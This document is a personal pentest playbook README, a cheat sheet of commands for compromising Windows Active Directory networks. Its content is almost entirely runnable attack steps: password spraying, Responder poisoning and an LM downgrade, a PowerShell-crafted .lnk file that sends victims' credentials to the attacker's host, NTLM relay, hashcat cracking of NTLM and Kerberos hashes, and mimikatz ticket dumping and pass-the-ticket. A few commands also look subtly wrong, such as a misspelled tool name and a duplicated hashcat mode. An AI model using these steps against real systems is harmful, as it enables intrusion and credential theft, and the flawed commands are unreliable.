# Gunnajs-Playbook
How to pentest like a Gunnaj

## Tools bby
### linWinPwn - Active Directory Vulnerability Scanner
https://github.com/lefayjey/linWinPwn
### BloodHound
https://github.com/fox-it/BloodHound.py
### mimikatz
https://github.com/ParrotSec/mimikatz
### Responder
https://github.com/lgandx/Responder
### breach-parse
https://github.com/hmaverickadams/breach-parse
### PRET
https://github.com/RUB-NDS/PRET

## Wordlists bby
### Create your own wordlist
https://zzzteph.github.io/weakpass/
### Top 10 million
https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt (8.1 MB)

### Crackstation
https://crackstation.net/files/crackstation.txt.gz (14.6 GB)

### Large p-list
https://download.g0tmi1k.com/wordlists/large/36.4GB-18_in_1.lst.7z (48.4 GB)

### Rockyou2021
https://github.com/ohmybahgosh/RockYou2021.txt (91.6 GB)

# VEV
## Nmap
#### Ping scan
```bash
sudo nmap -sP -p <output.txt> <IP/mask>
```
#### Full scan
```bash
sudo nmap -PN -sC -sV -p- -oA <output.txt> <IP/mask>
```
#### smb vuln scan
```bash
sudo nmap -PN --script smb-vuln* -p139,445 -oA <output.txt> <IP/mask>
```
## Find DC IP
#### Show domain name and DNS
```bash
sudo mncli dev show eth0
```
#### Show DC IP
```bash
nslookup -type=SRV _ldap._tcp.dc._msdcs.<AD_domain>
```

## linWinPwn 
### Unauthenticated
```bash
 sudo ./linWinPwn.sh -t <Domain_Controller_IP_or_Target_Domain> -M user <output_dir>
```
### With AD-user credentials 
```bash
sudo ./linWinPwn.sh -t <Domain_Controller_IP> -u <AD_user> -p <AD_password> -o <output_dir>
```
## Password spray
### Spray a password on a user list
```bash
crackmapexec smb <Domain_Controller_IP> -u users.txt -p <password> --continue-on-success
```
## Responder
### Kickstart responder
```bash
responder -I eth0
```

### Force lm downgrade
```bash
responder -I eth0 --lm
```

### Responder linkifle

#### In Powershell, use each command to create a linkfile for Responder
```powershell
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\Users\<User>\Desktop\<name>.lnk")
$lnk.TargetPath = "\\<ResponderIP>\@threat.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the dir this file lives in will perform an authentication request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```

### Crackmapexec NTLM-relay
#### Evaluate no smb-signing
```bash
crackmapexec smb <IPs> --gen-relay-list <outputIPs.txt>
```
#### NTLMRelayx
```bash
sudo python3 ntlmrelayx.py -smb2support -tf <outputIPs.txt>
```
#### Disbale SMB and HTTP in Responder.conf
```bash
[Responder Core]

; Servers to start
SQL = On
SMB = Off
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = On
HTTPS = Off
DNS = On
LDAP = On
DCERPC = On
WINRM = On
SNMP = Off
```

```
## SMB VEV
### Mount share
```bash
sudo mount.cifs <//ip/folder> <./folder> -o user=<username>,password=<password>,dom=<domain.com>
```

### Unmount share
```bash
sudo umount <./folder>
```

### Search for keywords in files
```bash
grep -i <keyword> *
```
## PRET
### Nmap printers
```bash
nmap -p 9100 <IP/mask>
```
```bash
pret.py target {ps,pjl,pcl}
```
## Zero Logon
* in the making 

## Hash cracking
### LM
```bash
hashcat64.exe -m 3000 -a 3 LM-hashes.txt -o cracked.txt
```

### NTLM
```bash
hashcat64.exe -m 1000 -a 3 NTLM-hashes.txt -o cracked.txt
```

### NTLMv1
```bash
hashcat64.exe -m 5500 -a 3 NTLMv1-hashes.txt -o cracked.txt
```

### NTLMv2
```bash
hashcat64.exe -m 5600 -a 0 NTLMv2-hashes.txt <passlist.txt> -o cracked.txt
```

### Kerberos 5 TGS
```bash
hashcat64.exe -m 13100 -a 0 krb5tgs-hashes.txt <passlist.txt> -o cracked.txt
```

### Kerberos 5 TGS AES128
```bash
hashcat64.exe -m 19600 -a 0 krb5tgsaes128-hashes.txt <passlist.txt> -o cracked.txt
```

### Kerberos 5 TGS AES256
```bash
hashcat64.exe -m 19600  -a 0 krb5tgsaes256.txt <passlist.txt> -o cracked.txt
```

### Kerberos ASREP
```bash
hashcat64.exe -m 18200 -a 0 asrep-hashes.txt <passlist.txt> -o cracked.txt
```

### MsCache 2 (slow af)
```bash
hashcat64.exe -m 2100 -a 0 mscache2-hashes.txt <passlist.txt> -o cracked.txt
```

## Mimikatz
### Dump tickets
```bash
mimikatz.exe
privilege::debug
sekurlsa::tickets /export
```

### Pass the ticket
```bash
mimikatz.exe
kerberos::ptt <ticket>
klist
```
